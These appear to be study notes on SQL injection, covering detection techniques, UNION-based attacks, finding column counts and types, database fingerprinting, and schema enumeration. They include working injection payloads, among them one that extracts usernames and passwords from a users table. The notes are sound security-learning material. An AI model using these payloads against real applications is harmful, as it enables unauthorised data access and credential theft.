# SQL injection

## How to detect SQL injection vulnerabilities
- The single quote character `'` and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

## SQL injection in different parts of the query
- Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query.
- However, SQL injection vulnerabilities can occur at any location (UPDATE, INSERT, SELECT [column, table], ORDER BY)

## Warning: OR 1=1 
- If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.

## SQL injection UNION attacks
- Requirements
  - How many columns are being returned from the original query
  - Which columns returned from the original query are of a suitable data type to hold the results from the injected query

### Determining the number of columns required
- First way: Injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs
  - Example (the injection point is a quoted string within the `WHERE` clause)
  - ```
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    etc.
    ```
- Second way: submitting a series of `UNION SELECT` payloads specifying a different number of null values
  - NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct. 
  - ```
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    etc.
    ```
- Note: the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results

### Database-specific syntax
- Example:
  - Oracle: every `SELECT` query must use the `FROM` keyword and specify a valid table
  - MySQL: the double-dash sequence must be followed by a space
  - https://portswigger.net/web-security/sql-injection/cheat-sheet

### Finding columns with a useful data type
- Do you want a string?
  - ```
    ' UNION SELECT 'a',NULL,NULL,NULL--
    ' UNION SELECT NULL,'a',NULL,NULL--
    ' UNION SELECT NULL,NULL,'a',NULL--
    ' UNION SELECT NULL,NULL,NULL,'a'--
    ```
  - Error example: Conversion failed when converting the varchar value 'a' to data type int.
   - If no error occurs and the response includes the injected string, the column is suitable for retrieving string data.

## Examining the database 
| Database type 	| Query |
| ----- | ----- |
| Microsoft, MySQL | 	SELECT @@version |
| Oracle 	| SELECT * FROM v$version |
|PostgreSQL | 	SELECT version() |
- `' UNION SELECT @@version--`
- Listing the contents of the database
- Most database types (except Oracle) have a set of views called the information schema
  - `information_schema.tables `
    - |TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
      | -- | -- | -- | -- |
      | MyDatabase | dbo | Products | BASE TABLE |
    - ` SELECT * FROM information_schema.tables`
  - ` information_schema.columns `
    - | TABLE_CATALOG |TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
      | -- | -- | -- | -- | -- |
      |MyDatabase | dbo | Users | UserId | int |
    - `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
- Oracle:
  - `SELECT * FROM all_tables`
    - `SELECT TABLE_NAME FROM all_tables`
  - `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
    - `SELECT COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS'`

### Retrieving multiple values within a single column
- You can retrieve multiple values together within this single column by concatenating the values together
- `' UNION SELECT username || '~' || password FROM users--`
  - https://portswigger.net/web-security/sql-injection/cheat-sheet
